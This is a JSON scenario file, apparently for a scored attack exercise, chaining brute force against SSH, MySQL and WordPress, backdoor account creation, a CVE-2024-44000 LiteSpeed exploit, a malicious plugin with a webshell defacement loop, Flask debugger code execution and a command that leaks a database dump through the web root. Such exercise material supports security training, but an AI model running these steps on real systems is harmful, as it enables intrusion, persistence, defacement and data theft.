{
    "about": {
        "name": "Easy Scenario",
        "description": "非常にシンプルなシナリオで、基本的な攻撃モジュールによる攻撃を実行します。",
        "version": "1.0.0",
        "author": "Ayato"
    },
    "scenario": [
        {
            "name": "SSH Brute Force Attack",
            "description": "This step performs a brute force attack on the SSH service to gain access.",
            "start": 3,
            "attack": {
                "module": "modules/attacks/ssh_brute_force.py",
                "options": {
                    "wordlist": "modules/wordlists/linux_users.json",
                    "cmd":"echo 'THIS USER WAS HACKED' > ~/hacked.txt"
                },
                "libraries": [
                    "paramiko>=2.7.2"
                ]
            },
            "onsuccess": {
                "module": "modules/backdoors/ssh_create_user.py",
                "options": {
                    "avaliable_credentials": "RETURN_VALUE",
                    "backdoor_credentials": {
                        "backdooruser": "backdooooooorpass",
                        "srvadmin": "backdooooooorpass"
                    },
                    "cmd": "echo 'THIS USER WAS HACKED AGAIN' >> ~/hacked.txt"
                },
                "libraries": [
                    "paramiko>=2.7.2"
                ]
            },
            "gain_points": 100
        },
        {
            "name": "Backdoor Access Verification",
            "description": "This step verifies if the backdoor user can access the system.",
            "start": 1,
            "attack": {
                "module": "modules/attacks/ssh_brute_force.py",
                "options": {
                    "wordlist": "modules/wordlists/linux_backdoor.json",
                    "cmd": "sudo systemctl stop apache2"
                },
                "libraries": [
                    "paramiko>=2.7.2"
                ]
            },
            "gain_points": 50
        },
        {
            "name": "MySQL Brute Force Attack",
            "description": "This step performs a brute force attack on the MySQL service to gain access.",
            "start": 3,
            "attack": {
                "module": "modules/attacks/mysql_brute_force.py",
                "options": {
                    "wordlist": "modules/wordlists/mysql_users.json"
                },
                "libraries": [
                    "pymysql>=1.0.2"
                ]
            },
            "onsuccess": {
                "module": "modules/backdoors/mysql_evil_wpuser.py",
                "options": {
                    "avaliable_credentials": "RETURN_VALUE",
                    "database": "wp",
                    "prefix": "wp_",
                    "data": {
                        "user_login": "evilfrommysql",
                        "user_pass": "$wp$2y$10$ZusVWtRw74cpjr9QFYgBLu7rLlw6emQenu/KNfyGyvr4PLt0hqzZW",
                        "user_nicename": "evilfrommysql",
                        "user_email": "evilman@example.com"
                    }
                },
                "libraries": [
                    "pymysql>=1.0.2",
                    "cryptography>=3.4.7"
                ]
            },
            "gain_points": 100
        },
        {
            "name": "WordPress XMLRPC Brute Force Attack",
            "description": "This step performs a brute force attack on the WordPress XMLRPC service to gain access.",
            "start": 3,
            "attack": {
                "module": "modules/attacks/wordpress_xmlrpc_brute_force.py",
                "options": {
                    "uri": "/xmlrpc.php",
                    "wordlist": "modules/wordlists/wordpress_users.json",
                    "user_agent": "I AM ATTACKER"
                },
                "libraries": [
                    "requests>=2.25.1"
                ]
            },
            "onsuccess": {
                "module": "modules/backdoors/wordpress_create_user.py",
                "options": {
                    "avaliable_credentials": "RETURN_VALUE",
                    "uri": "/wp-admin/user-new.php",
                    "cookies": "",
                    "backdoor_credentials": {
                        "evilfromxmlrpc": "admin"
                    },
                    "user_agent": "I AM ATTACKER"
                },
                "libraries": [
                    "requests>=2.25.1",
                    "beautifulsoup4>=4.9.3"
                ]
            },
            "gain_points": 100
        },
        {
            "name": "WordPress LiteSpeed Cache Plugin / CVE-2024-44000", 
            "description": "WordPress LiteSpeed Cache Plugin Infomation Leakage Exploit",
            "start": 3,
            "attack": {
                "module": "modules/attacks/wordpress_litespeedcache.py",
                "options": {
                    "user_agent": "I AM ATTACKER"
                },
                "libraries": [
                    "requests>=2.25.1"
                ]
            },
            "onsuccess": {
                "module": "modules/backdoors/wordpress_create_user.py",
                "options": {
                    "avaliable_credentials": "",
                    "cookies": "RETURN_VALUE",
                    "uri": "/wp-admin/user-new.php",
                    "backdoor_credentials": {
                        "evilfromlitespeed": "admin"
                    },
                    "user_agent": "I AM ATTACKER"
                },
                "libraries": [
                    "requests>=2.25.1",
                    "beautifulsoup4>=4.9.3"
                ]
            },
            "gain_points": 150
        },
        {
            "name": "WordPress Evil Plugin upload",
            "description": "This step uploads a malicious plugin to the WordPress site to gain a backdoor.",
            "start": 3,
            "attack": {
                "module": "modules/attacks/wordpress_evil_plugin_upload.py",
                "options": {
                    "uri": "/wp-admin/plugin-install.php",
                    "user_agent": "I AM ATTACKER",
                    "backdoor_credentials": "modules/wordlists/wordpress_backdoors.json",
                    "workdir": "/tmp"
                },
                "libraries": [
                    "requests>=2.25.1",
                    "beautifulsoup4>=4.9.3"
                ]
            },
            "onsuccess": {
                "module": "modules/attacks/wordpress_exec_webshell.py",
                "options": {
                    "user_agent": "I AM ATTACKER",
                    "command": "while true; do sleep 60 && /usr/local/bin/wp post create --path=/var/www/html --post_type=post --post_status=publish --post_title=HACKED --post_author=1 --post_content=YESSS_WE_HACKED_YOUR_WEBSITE; done &"
                },
                "libraries": [
                    "requests>=2.25.1"
                ]
            },
            "gain_points": 100
        },
        {
            "name": "Flask Debugger Command execution",
            "description": "This step performs a command execution via flask debug bar.",
            "start": 3,
            "attack": {
                "module": "modules/attacks/flask_debugger_command_exec.py",
                "options": {
                    "port": "5000",
                    "uri": "/api/users",
                    "pin": "000-000-000",
                    "python_cmd": "path='/home/webadmin/app/templates/index.html'; d=open(path, encoding='utf-8').read().replace('<h1>サーバー管理コンソール','<style>body {background-color: red;}</style><h1>HACKED!!'); open(path, 'w', encoding='utf-8').write(d)",
                    "user_agent": "I AM ATTACKER"
                },
                "libraries": [
                    "requests>=2.25.1",
                    "beautifulsoup4>=4.9.3"
                ]
            },
            "gain_points": 150
        },
        {
            "name": "Webdav Evil File uploader",
            "description": "This step uploads evil file on the target server",
            "start": 3,
            "attack": {
                "module": "modules/attacks/webdav_evilfile_uploader.py",
                "options": {
                    "cmd": "curl -X POST http://127.0.0.1:5000/api/logs -d 'filename=/tmp/dbbackups/wp.sql' -o '/var/www/html/wp.sql' && /usr/local/bin/wp post create --path=/var/www/html --post_type=post --post_status=publish --post_title='!! DataBreach !!' --post_author=1 --post_content='<a href=/wp.sql>Click to View DataBreach</a>'",
                    "filename": "evil_exec.php",
                    "user_agent": "I AM ATTACKER"
                },
                "libraries": [
                    "requests>=2.25.1"
                ]
            },
            "gain_points": 150
        }
    ]
}